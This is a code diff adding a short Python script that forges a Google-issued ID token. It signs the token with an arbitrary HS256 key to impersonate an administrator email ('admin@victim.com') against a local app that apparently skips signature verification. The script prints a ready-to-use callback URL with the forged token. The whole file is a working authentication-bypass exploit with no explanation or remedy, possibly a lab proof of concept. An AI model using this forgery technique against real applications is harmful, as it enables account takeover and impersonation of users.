@@ -1,0 +1,24 @@
+from jose import jwt
+import time
+
+# You can set this email to impersonate anyone
+FAKE_USER_EMAIL = "admin@victim.com"
+
+payload = {
+    "sub": "1234567890",
+    "name": "Forged Admin",
+    "email": FAKE_USER_EMAIL,
+    "picture": "https://i.imgur.com/yourphoto.jpg",
+    "aud": "489703958449-iiqtp7trstd8rom3kbmpcag2da1dgvvf.apps.googleusercontent.com",
+    "iss": "https://accounts.google.com",
+    "iat": int(time.time()),
+    "exp": int(time.time()) + 3600
+}
+
+# Sign with a fake key since the app doesn't verify the signature
+token = jwt.encode(payload, 'insecurekey', algorithm='HS256')
+
+print("Forged Token:\n")
+print(token)
+print("\nUse this in your browser:")
+print(f"http://localhost:5000/callback?id_token={token}")
